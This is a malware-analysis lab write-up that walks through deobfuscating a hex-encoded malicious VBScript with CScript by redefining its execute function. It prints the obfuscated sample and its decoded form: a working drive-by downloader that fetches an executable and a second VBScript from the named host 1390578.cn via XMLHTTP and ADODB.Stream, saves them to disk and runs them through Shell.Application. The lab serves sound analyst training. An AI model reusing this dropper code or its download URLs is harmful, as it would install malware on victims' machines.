# Lab 3.15: Deobfuscating vbscript.vbs using CScript

- [Lab 3.15: Deobfuscating vbscript.vbs using CScript](#lab-315-deobfuscating-vbscriptvbs-using-cscript)
  - [Objectives](#objectives)
  - [Steps](#steps)
  - [1 - Examine vbscript.vbs](#1---examine-vbscriptvbs)
  - [2 - Redefine the execute function to print its argument, instead of executing it](#2---redefine-the-execute-function-to-print-its-argument-instead-of-executing-it)
  - [3 - Run the script using CScript](#3---run-the-script-using-cscript)

---

## Objectives

- Gain familiarity with malicious VBScript scripts.
- Learn how to deobfuscate VBScript using the CScript interpreter

<br/>

---

## Steps

1. Examine vbscript.vbs in Notepad++ to determine which statements might need to be modified or redefined to deobfuscate the script.
2. Redefine the execute function to print its argument, instead of executing it.
3. Execute the modified vbscript.vbs file using CScript to deobfuscate the script.

<br/>

---

## 1 - Examine vbscript.vbs

Open `vbscript.vbs` on **Notepad++**:

```
abc = "006F006E0020006500720072006F007200200072006500730075006D00650020006E006500780074000D000A00640069006D002000750072006C002C0070006100740068000D000A00750072006C003D00220068007400740070003A002F002F0031003300390030003500370038002E0063006E002F0069006D0061006700650073002F0061002E0065007800650022000D000A0070006100740068003D00220043003A005C005C004E0054004400450054004500430054002E0045005800450022000D000A007300650074002000610064006F003D00280064006F00630075006D0065006E0074002E0063007200650061007400650045006C0065006D0065006E007400280022006F0062006A006500630074002200290029000D000A006300310020003D00220063006C007300690064003A004200440022000D000A00630032003D0022003900360043003500350036002D0036003500410033002D003100310022000D000A00630033003D002200440030002D0039003800330041002D0030003000430030003400460022000D000A00630034003D00220043003200390045003300360022000D000A00610064006F002E007300650074004100740074007200690062007500740065002000220063006C006100730073006900640022002C002000630031002600630032002600630033002600630034000D000A00430041004F0069003D0022004D006900630072006F0073006F00660074002E0058004D004C00480054005400500022000D000A00730065007400200078006D006C003D00610064006F002E004300720065006100740065004F0062006A006500630074002800430041004F0069002C002200220029000D000A00620031003D002200410022000D000A00620032003D00220064006F0022000D000A00620033003D0022006400620022000D000A00620034003D0022002E0022000D000A00620035003D0022007300740022000D000A00620036003D0022007200650022000D000A00620037003D00220061006D0022000D000A00620038003D00620031002600620032002600620033002600620034002600620035002600620036002600620037000D000A007300650074002000610063003D00610064006F002E006300720065006100740065006F0062006A006500630074002800620038002C002200220029000D000A00610031003D002200470022000D000A00610032003D002200450022000D000A00610033003D002200540022000D000A0078006D006C002E004F00700065006E002000610031002600610032002600610033002C00750072006C002C0030000D000A0078006D006C002E00530065006E0064000D000A00610063002E0074007900700065003D0031000D000A00610063002E006F00700065006E000D000A00610063002E0077007200690074006500200078006D006C002E0072006500730070006F006E007300650042006F00640079000D000A00610063002E00730061007600650074006F00660069006C006500200070006100740068002C0032000D000A0076006100720020007300680065006C006C003D00610064006F002E006300720065006100740065006F0062006A00650063007400280022005300680065006C006C002E004100700070006C00690063006100740069006F006E0022002C002200220029000D000A00610063002E0063006C006F00730065000D000A007300680065006C006C002E005300680065006C006C00200070006100320032003200740068002C00220022002C00220022002C0022006F00700065006E0022002C0030000D000A"
cde = "006F006E0020006500720072006F007200200072006500730075006D00650020006E006500780074000D000A006D0031003D0022006F0062006A0065006300740022000D000A006D0032003D00220063006C006100730073006900640022000D000A006D0033003D00220063006C007300690064003A00420044003900360043003500350036002D0036003500410033002D0031003100440030002D0039003800330041002D0030003000430030003400460043003200390045003300360022000D000A006D0034003D0022004D006900630072006F0073006F00660074002E0058004D004C00480054005400500022000D000A006D0035003D0022005300680065006C006C002E004100700070006C00690063006100740069006F006E0022000D000A004D006900720063006F004C006F006E00670020003D002000220068007400740070003A002F002F0031003300390030003500370038002E0063006E002F0069006D0061006700650073002F006A0063002E0076006200730022000D000A0053006500740020004D006900720063006F004C006F006E006700630020003D002000280064006F00630075006D0065006E0074002E0063007200650061007400650045006C0065006D0065006E00740028006D003100290029000D000A004D006900720063006F004C006F006E00670063002E0073006500740041007400740072006900620075007400650020006D0032002C0020006D0033000D000A00730065007400750072006C0061003D00220064006F0077006E0022000D000A00730065007400750072006C0062003D002200660069006C00650022000D000A00730065007400750072006C0063003D00220063006F007000790022000D000A00730065007400750072006C0064003D002200650078006900740022000D000A004D006900720063006F004C006F006E00670069003D006D0034000D000A0053006500740020004D006900720063006F004C006F006E006700640020003D0020004D006900720063006F004C006F006E00670063002E004300720065006100740065004F0062006A0065006300740028004D006900720063006F004C006F006E00670069002C002200220029000D000A00730065007400750072006C0066003D002200410064006F0022000D000A00730065007400750072006C0067003D002200640062002E0022000D000A00730065007400750072006C0068003D00220053007400720022000D000A00730065007400750072006C0069003D002200650061006D0022000D000A004D006900720063006F004C006F006E00670066003D00730065007400750072006C0066002600730065007400750072006C0067002600730065007400750072006C0068002600730065007400750072006C0069000D000A004D006900720063006F004C006F006E00670067003D004D006900720063006F004C006F006E00670066000D000A0073006500740020004D006900720063006F004C006F006E006700610020003D0020004D006900720063006F004C006F006E00670063002E006300720065006100740065006F0062006A0065006300740028004D006900720063006F004C006F006E00670067002C002200220029000D000A004D006900720063006F004C006F006E00670061002E00740079007000650020003D00200031000D000A004D006900720063006F004C006F006E00670068003D00220047004500540022000D000A004D006900720063006F004C006F006E00670064002E004F00700065006E0020004D006900720063006F004C006F006E00670068002C0020004D006900720063006F004C006F006E0067002C002000460061006C00730065000D000A004D006900720063006F004C006F006E00670064002E00530065006E0064000D000A004D006900720063006F004C006F006E00670039003D0022006A0063002E0076006200730022000D000A0073006500740020004D006900720063006F004C006F006E006700620020003D0020004D006900720063006F004C006F006E00670063002E006300720065006100740065006F0062006A006500630074002800220053006300720069007000740069006E0067002E00460069006C006500530079007300740065006D004F0062006A0065006300740022002C002200220029000D000A0073006500740020004D006900720063006F004C006F006E006700650020003D0020004D006900720063006F004C006F006E00670062002E004700650074005300700065006300690061006C0046006F006C006400650072002800320029000D000A004D006900720063006F004C006F006E00670061002E006F00700065006E000D000A004D006900720063006F004C006F006E00670038003D0022004D006900720063006F004C006F006E00670061002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670061002C004D006900720063006F004C006F006E0067003800290022000D000A004D006900720063006F004C006F006E00670037003D0022004D006900720063006F004C006F006E00670062002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670062002C004D006900720063006F004C006F006E0067003700290022000D000A004D006900720063006F004C006F006E00670036003D0022004D006900720063006F004C006F006E00670063002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670064002C004D006900720063006F004C006F006E0067003600290022000D000A004D006900720063006F004C006F006E00670035003D0022004D006900720063006F004C006F006E00670064002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670066002C004D006900720063006F004C006F006E0067003500290022000D000A004D006900720063006F004C006F006E00670034003D0022004D006900720063006F004C006F006E00670065002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670067002C004D006900720063006F004C006F006E0067003400290022000D000A004D006900720063006F004C006F006E00670033003D0022004D006900720063006F004C006F006E00670066002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670068002C004D006900720063006F004C006F006E0067003400290022000D000A004D006900720063006F004C006F006E00670032003D0022004D006900720063006F004C006F006E00670067002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670069002C004D006900720063006F004C006F006E0067003300290022000D000A004D006900720063006F004C006F006E00670031003D0022004D006900720063006F004C006F006E00670068002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670067002C004D006900720063006F004C006F006E0067003100290022000D000A004D006900720063006F004C006F006E00670030003D0022004D006900720063006F004C006F006E00670069002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E0067006B002C004D006900720063006F004C006F006E0067003000290022000D000A004D006900720063006F004C006F006E00670039003D0020004D006900720063006F004C006F006E00670062002E004200750069006C006400500061007400680028004D006900720063006F004C006F006E00670065002C004D006900720063006F004C006F006E006700390029000D000A004D006900720063006F004C006F006E00670061002E007700720069007400650020004D006900720063006F004C006F006E00670064002E0072006500730070006F006E007300650042006F00640079000D000A004D006900720063006F004C006F006E00670061002E00730061007600650074006F00660069006C00650020004D006900720063006F004C006F006E00670039002C0032000D000A004D006900720063006F004C006F006E00670061002E0063006C006F00730065000D000A0073006500740020004D006900720063006F004C006F006E006700650020003D0020004D006900720063006F004C006F006E00670063002E006300720065006100740065006F0062006A0065006300740028006D0035002C002200220029000D000A004D006900720063006F004C006F006E00670065002E005300680065006C006C00450078006500630075007400650020004D006900720063006F004C006F006E00670039002C004200420053002C004200420053002C0022006F00700065006E0022002C0030000D000A"
Function decode(x)
For i = 1 To Len(x) Step 4
If Mid(x, i, 4) = "0D0A" Then
decode = decode & vbCrLf
Else
decode = decode & Chr(Int("&H" & Mid(x, i, 4)))
End If
Next
End Function
execute (decode(abc))
execute (decode(cde))
```

- It looks like `abc` and `cde` are in HEX format
- From `execute (decode())` command, the HEX code in `abc` and `cde` will be decoded and executed
  
<br/>

Use a online HEX to TEXT tool to convert the HEX to plaintext:

- https://unit-conversion.info/texttools/hexadecimal/
- `abc` is converted to:

```
on error resume next

dim url,path

url="http://1390578.cn/images/a.exe"

path="C:\\NTDETECT.EXE"

set ado=(document.createElement("object"))

c1 ="clsid:BD"

c2="96C556-65A3-11"

c3="D0-983A-00C04F"

c4="C29E36"

ado.setAttribute "classid", c1&c2&c3&c4

CAOi="Microsoft.XMLHTTP"

set xml=ado.CreateObject(CAOi,"")

b1="A"

b2="do"

b3="db"

b4="."

b5="st"

b6="re"

b7="am"

b8=b1&b2&b3&b4&b5&b6&b7

set ac=ado.createobject(b8,"")

a1="G"

a2="E"

a3="T"

xml.Open a1&a2&a3,url,0

xml.Send

ac.type=1

ac.open

ac.write xml.responseBody

ac.savetofile path,2

var shell=ado.createobject("Shell.Application","")

ac.close

shell.Shell pa222th,"","","open",0

```

- Download `http://1390578.cn/images/a.exe` to `C:\NTDETECT.EXE`

<br/>

- `cde` is converted to:

```
on error resume next

m1="object"

m2="classid"

m3="clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"

m4="Microsoft.XMLHTTP"

m5="Shell.Application"

MircoLong = "http://1390578.cn/images/jc.vbs"

Set MircoLongc = (document.createElement(m1))

MircoLongc.setAttribute m2, m3

seturla="down"

seturlb="file"

seturlc="copy"

seturld="exit"

MircoLongi=m4

Set MircoLongd = MircoLongc.CreateObject(MircoLongi,"")

seturlf="Ado"

seturlg="db."

seturlh="Str"

seturli="eam"

MircoLongf=seturlf&seturlg&seturlh&seturli

MircoLongg=MircoLongf

set MircoLonga = MircoLongc.createobject(MircoLongg,"")

MircoLonga.type = 1

MircoLongh="GET"

MircoLongd.Open MircoLongh, MircoLong, False

MircoLongd.Send

MircoLong9="jc.vbs"

set MircoLongb = MircoLongc.createobject("Scripting.FileSystemObject","")

set MircoLonge = MircoLongb.GetSpecialFolder(2)

MircoLonga.open

MircoLong8="MircoLonga.BuildPath(MircoLonga,MircoLong8)"

MircoLong7="MircoLongb.BuildPath(MircoLongb,MircoLong7)"

MircoLong6="MircoLongc.BuildPath(MircoLongd,MircoLong6)"

MircoLong5="MircoLongd.BuildPath(MircoLongf,MircoLong5)"

MircoLong4="MircoLonge.BuildPath(MircoLongg,MircoLong4)"

MircoLong3="MircoLongf.BuildPath(MircoLongh,MircoLong4)"

MircoLong2="MircoLongg.BuildPath(MircoLongi,MircoLong3)"

MircoLong1="MircoLongh.BuildPath(MircoLongg,MircoLong1)"

MircoLong0="MircoLongi.BuildPath(MircoLongk,MircoLong0)"

MircoLong9= MircoLongb.BuildPath(MircoLonge,MircoLong9)

MircoLonga.write MircoLongd.responseBody

MircoLonga.savetofile MircoLong9,2

MircoLonga.close

set MircoLonge = MircoLongc.createobject(m5,"")

MircoLonge.ShellExecute MircoLong9,BBS,BBS,"open",0


```

- Suspicious URL: `http://1390578.cn/images/jc.vbs`

<br/>

---

## 2 - Redefine the execute function to print its argument, instead of executing it

We can redefine the function `execute(x)` to print the content:

```
Function execute(x)
  WScript.Echo(x)
End Function
```

![picture 354](../images/b3a4cd69d7f7594e401000176bedb3c09cb2c715ff723ad926f38f26d87da282.png)  

<br/>

---

## 3 - Run the script using CScript

Run `vbscript.vbs` using `cscript`:

![picture 355](../images/8971261f8cc51e9467ebe7f07e2af06481355439794e73415895db3d0b1c4233.png)  

- Same as the decoded result in #1
  
<br/>

---